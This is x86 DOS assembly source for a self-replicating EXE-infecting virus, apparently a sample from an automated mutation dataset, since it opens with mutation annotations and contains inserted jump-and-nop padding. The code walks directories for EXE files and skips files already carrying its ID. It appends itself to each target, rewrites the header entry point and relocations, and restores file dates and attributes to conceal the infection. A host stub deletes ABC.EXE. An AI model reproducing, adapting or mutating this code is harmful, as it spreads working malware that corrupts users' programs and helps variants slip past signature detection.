;0.9869791666666666
;UntouchBlock_1
;0.994750656167979
;NoMutation
;NoMutation
 		.SEQ ;segments must appear in sequential order
HOSTSEG SEGMENT BYTE
 		ASSUME CS:HOSTSEG,SS:HSTACK
PGMSTR DB ’ABC.EXE’,0
HOST:
	 mov ax,cs 
	 mov ds,ax
	 mov dx,OFFSET PGMSTR
	 mov ah,41H
	 int 21H 
	 mov ah,4CH
	 mov al,0
	 int 21H 
HOSTSEG ENDS
HSTACK SEGMENT PARA STACK
db 100H dup (?)
HSTACK ENDS
STACKSIZE EQU 100H 
NUMRELS EQU 2 
VSEG SEGMENT PARA
 	 ASSUME CS:VSEG,DS:VSEG,SS:VSTACK
VIRUSID 	DW 0C8AAH 
OLDDTA 		DD 0 
DTA1 		DB 2BH dup (?) 
DTA2		DB 56H dup (?) 
EXE_HDR 	DB 1CH dup (?) 
EXEFILE 	DB ’\*.EXE’,0 
ALLFILE 	DB ’\*.*’,0 
USEFILE 	DB 78 dup (?) 
LEVEL 		DB 0 
HANDLE 		DW 0 
FATTR 		DB 0 
FTIME 		DW 0 
FDATE 		DW 0 
FSIZE 		DD 0 
VIDC 		DW 0 
VCODE 		DB 1 


VIRUS:
		 push ax
		 mov ax,cs
		 mov ds,ax 						
		 mov ax,es 						
		 mov WORD PTR [OLDDTA+2],ax 	
		 call SHOULDRUN 				
		 jz   N1
		 JMP  REL1
		 N1: 						
		 call SETSR 
		 call NEW_DTA 					
		 call FIND_FILE 				
		 jz   N2
		 JMP  FINISH 					
		 N2:
		 call SAVE_ATTRIBUTE 			
		 call INFECT 					
		 call REST_ATTRIBUTE 			


FINISH:  call RESTORE_DTA 	
 		 pop ax

REL1: 						
 		 mov ax,HSTACK 				
 		 cli 
 		 mov ss,ax

REL1A: 						
 		 mov sp,OFFSET HSTACK
 		 mov es,WORD PTR [OLDDTA+2] 
		 mov ds,WORD PTR [OLDDTA+2] 
 		 sti 					

REL2:					 			
 		jmp FAR PTR HOST 


FIND_FILE:
	mov al,’\’ 
	mov BYTE PTR [USEFILE],al
	mov si,OFFSET USEFILE+1
	xor dl,dl
	mov ah,47H
	int 21H 
	cmp BYTE PTR [USEFILE+1],0 
	jz  N3
	JMP FF2 
	N3:
	xor al,al 
	mov BYTE PTR [USEFILE],al 

FF2: mov al,2
	mov [LEVEL],al 
	call FINDBR 
	jnz N4
	JMP FF3 
	N4:
	xor al,al 
	mov BYTE PTR [USEFILE],al 
	inc al 
	mov [LEVEL],al 
	call FINDBR 

FF3:
	ret 

FINDBR:
	call FINDEXE 
	jc  N5
	JMP FBE3 
	N5:
	cmp [LEVEL],0 
	jnz N6
	JMP FBE1 
	N6:
	dec [LEVEL] 
	mov di,OFFSET USEFILE 
	mov si,OFFSET ALLFILE 
	call CONCAT 
	inc di
	push di 
	call FIRSTDIR 
	jz  N7
	JMP FBE 
	N7:

FB1: 
		pop di 
		xor al,al
		stosb
		mov di,OFFSET USEFILE
		mov bx,OFFSET DTA2+1EH
		mov al,[LEVEL]
		mov dl,2BH 
		mul dl 
		add bx,ax 
		mov si,bx
		call CONCAT 
		push di 
		call FINDBR 
		jnz N8
		JMP FBE2 
		N8:
		call NEXTDIR 
		jnz N9
		JMP FB1 
		N9:

FBE: 
		inc [LEVEL] 
		pop di 
		xor al,al 
		stosb

FBE1: mov al,1 
	or al,al
	ret

FBE2: pop di 

FBE3: xor al,al 
 	  ret 


FINDEXE:
		mov dx,OFFSET DTA1 
		mov ah,1AH
		int 21H
		mov di,OFFSET USEFILE
		mov si,OFFSET EXEFILE
		call CONCAT 
		push di 
		mov dx,OFFSET USEFILE
		mov cx,3FH 
		mov ah,4EH
		int 21H

NEXTEXE:
		or al,al 
		jz N10
		JMP FEC 
		N10:
		pop di
		inc di
		stosb 
		mov di,OFFSET USEFILE
		mov si,OFFSET DTA1+1EH
		call CONCAT 
		dec di
		push di
		call FILE_OK 
		jc N11
		JMP FENC 
		N11:
		mov ah,4FH
		int 21H 
		jmp SHORT NEXTEXE 

FEC: 
	 pop di
 	 mov BYTE PTR [di],0 
	 stc
	 ret

FENC:
	 pop di
	 ret


FIRSTDIR:
	 call GET_DTA
	 push dx 
	 mov ah,1AH 
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov cx,10H 
	 mov ah,4EH 
	 int 21H

NEXTD1:
	 pop bx 
	 or al,al 
	 jz N12
	 JMP NEXTD3 
	 N12:
	 test BYTE PTR [bx+15H],10H 
	 jnz N13
	 JMP NEXTDIR 
	 N13:
	 cmp BYTE PTR [bx+1EH],’.’ 
	 je N14
	 JMP NEXTD2 
	 N14:
	 
NEXTDIR: 
	 call GET_DTA 
	 push dx
	 mov ah,1AH 
	 int 21H
	 mov ah,4FH
	 int 21H 
	 jmp NEXTD1 ;SHORT NEXTD1 -- uncomment for short jump

NEXTD2:
 	 xor al,al 

NEXTD3:
	 ret 


GET_DTA:
 mov dx,OFFSET DTA2
 mov al,2BH
 mul [LEVEL]
 add dx,ax 
 ret


CONCAT:
	 mov al,byte ptr es:[di] 
	 inc di
	 or al,al
	 jnz CONCAT ;unmodified code be careful rit
	 dec di 
	 push di 

CONCAT2:
	 cld
	 lodsb 
	 stosb
	 or al,al
	 jnz CONCAT2 ;unmodified code be careful rit
	 pop di 
	 ret 	 


FILE_OK:
	 call GET_EXE_HEADER 
	 jnc N15
	 JMP OK_END 
	 N15:
	 call CHECK_SIG_OVERLAY 
	 jnc N16
	 JMP OK_END 
	 N16:
	 call REL_ROOM 
	 jnc N17
	 JMP OK_END 
	 N17:
	 call IS_ID_THERE 

OK_END: ret 	 


CHECK_SIG_OVERLAY:
		 mov al,’M’ 
		 mov ah,’Z’
		 cmp ax,WORD PTR [EXE_HDR]
		 jnz N18
		 JMP CSO_1
		 N18:
		 stc 
		 ret

CSO_1: 	 xor ax,ax
	     sub ax,WORD PTR [EXE_HDR+26]
	     ret 


GET_EXE_HEADER:
	 mov dx,OFFSET USEFILE
	 mov ax,3D02H 
	 int 21H
	 jnc N19
	 JMP RE_RET 
	 N19:
	 mov [HANDLE],ax 
	 mov bx,ax 
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR 
	 mov ah,3FH
	 int 21H

RE_RET: ret 


REL_ROOM:
	 mov ax,WORD PTR [EXE_HDR+8] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+6] 
	 add ax,ax
	 add ax,ax
	 sub ax,WORD PTR [EXE_HDR+24] 
	 cmp ax,4*NUMRELS 

RR_RET: ret     


IS_ID_THERE:
	 mov ax,WORD PTR [EXE_HDR+22] 
	 add ax,WORD PTR [EXE_HDR+8] 
	 mov dx,16
	 mul dx
	 mov cx,dx
	 mov dx,ax 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ah,3FH
	 mov bx,[HANDLE]
	 mov dx,OFFSET VIDC
	 mov cx,2 
	 int 21H
	 jnc N20
	 JMP II_RET 
	 N20:
	 mov ax,[VIDC]
	 cmp ax,[VIRUSID] 
	 clc
	 jz N21
	 JMP II_RET 
	 N21:
	 stc 

II_RET: ret


SETBDY:
	 mov al,BYTE PTR [FSIZE]
	 and al,0FH 
	 jnz N22
	 JMP SB_E 
	 N22:
	 mov cx,10H 
	 sub cl,al 
	 mov dx,OFFSET FINAL
	 add WORD PTR [FSIZE],cx 
	 adc WORD PTR [FSIZE+2],0
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H

SB_E: ret


INFECT:
	 mov cx,WORD PTR [FSIZE+2]
	 mov dx,WORD PTR [FSIZE]
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H 
	 call SETBDY 
	 mov cx,OFFSET FINAL 
	 xor dx,dx 
	 mov bx,[HANDLE] 
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE] 
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1 
	 inc bx
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+14 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL1A 
	 inc bx 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+16 
	 mov bx,[HANDLE] 
	 mov cx,2
	 mov ah,40H 
	 int 21H
	 mov dx,WORD PTR [FSIZE]
	 mov cx,WORD PTR [FSIZE+2]
	 mov bx,OFFSET REL2 
	 add bx,1 
	 add dx,bx
	 mov bx,0
	 adc cx,bx 
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov dx,OFFSET EXE_HDR+20 
	 mov bx,[HANDLE]
	 mov cx,4
	 mov ah,40H 
	 int 21H
	 xor cx,cx
	 xor dx,dx
	 mov bx,[HANDLE]
QOVNP:
		JMP 	CFLLQ
nop
nop
nop
CFLLQ:
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [FSIZE] 
	 mov cl,4 
	 shr ax,cl 
	 mov bx,WORD PTR [FSIZE+2]
	 and bl,0FH
	 mov cl,4
	 shl bl,cl
	 add ah,bl
	 sub ax,WORD PTR [EXE_HDR+8] 
	 mov WORD PTR [EXE_HDR+22],ax
	 mov bx,OFFSET FINAL 
	 add bx,10H 
	 mov cl,4 
	 shr bx,cl
	 add ax,bx
	 mov WORD PTR [EXE_HDR+14],ax 
	 mov ax,OFFSET VIRUS 
	 mov WORD PTR [EXE_HDR+20],ax 
	 mov ax,STACKSIZE 
	 mov WORD PTR [EXE_HDR+16],ax ;and save it
	 mov dx,WORD PTR [FSIZE+2]
	 mov ax,WORD PTR [FSIZE] 
	 mov bx,OFFSET FINAL
	 add ax,bx
	 xor bx,bx
	 adc dx,bx 
	 add ax,200H 
	 adc dx,bx
	 push ax
	 mov cl,9
	 shr ax,cl
	 mov cl,7
	 shl dx,cl
	 add ax,dx
	 mov WORD PTR [EXE_HDR+4],ax 
	 pop ax
	 and ax,1FFH 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,NUMRELS 
NMAXS:
	 add WORD PTR [EXE_HDR+6],ax
	 mov cx,1CH 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+6] 
	 dec ax 
	 dec ax 
	 mov bx,4 
	 mul bx
	 add ax,WORD PTR [EXE_HDR+24]
	 mov bx,0
	 adc dx,bx 
	 mov cx,dx
	 mov dx,ax
	 mov bx,[HANDLE]
	 mov ax,4200H 
	 int 21H
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL1 
	 inc bx 
	 mov WORD PTR [EXE_HDR],bx 
	 mov WORD PTR [EXE_HDR+2],ax 
	 mov ax,WORD PTR [EXE_HDR+22]
	 mov bx,OFFSET REL2
	 add bx,3 
	 mov WORD PTR [EXE_HDR+4],bx 
	 mov WORD PTR [EXE_HDR+6],ax
	 mov cx,8 
	 mov dx,OFFSET EXE_HDR
	 mov bx,[HANDLE]
	 mov ah,40H 
	 int 21H
	 ret 



TIMECT EQU 63 


SHOULDRUN:
	 xor ah,ah 

SR1: ret 
 	 int 1AH
 	 and dl,TIMECT 
 	 ret ;



SETSR:
	 mov al,90H 
	 mov BYTE PTR SR1,al 
	 ret


NEW_DTA:
	 mov ah,2FH 
	 int 21H
	 mov WORD PTR [OLDDTA],bx
	 mov ax,es
	 mov WORD PTR [OLDDTA+2],ax
	 mov ax,cs
	 mov es,ax 
	 mov dx,OFFSET DTA1 
	 mov ah,1AH
	 int 21H 
	 ret

RESTORE_DTA:
	 mov dx,WORD PTR [OLDDTA] 
	 mov ax,WORD PTR [OLDDTA+2]
	 mov ds,ax
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
	 mov ds,ax
	 ret	 

SAVE_ATTRIBUTE:
	 mov ah,43H 
	 mov al,0
	 mov dx,OFFSET USEFILE
	 int 21H
	 mov [FATTR],cl 
	 mov ah,43H
	 mov al,1
	 mov dx,OFFSET USEFILE
	 mov cl,0
	 int 21H
	 mov dx,OFFSET USEFILE
	 mov al,2 
	 mov ah,3DH 
	 int 21H
	 mov [HANDLE],ax 
	 mov ah,57H 
	 xor al,al
	 mov bx,[HANDLE]
	 int 21H
	 mov [FTIME],cx 
	 mov [FDATE],dx 
	 mov ax,WORD PTR [DTA1+28] 
	 mov WORD PTR [FSIZE+2],ax 
	 mov ax,WORD PTR [DTA1+26] 
	 mov WORD PTR [FSIZE],ax
 	 ret



REST_ATTRIBUTE:
	 mov dx,[FDATE] 
	 mov cx,[FTIME]
	 mov ah,57H 
	 mov al,1
	 mov bx,[HANDLE]
	 int 21H
	 mov ah,3EH
	 mov bx,[HANDLE]
	 int 21H
	 mov cl,[FATTR]
	 xor ch,ch
	 mov ah,43H 
	 mov al,1
	 mov dx,OFFSET USEFILE
	 int 21H
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
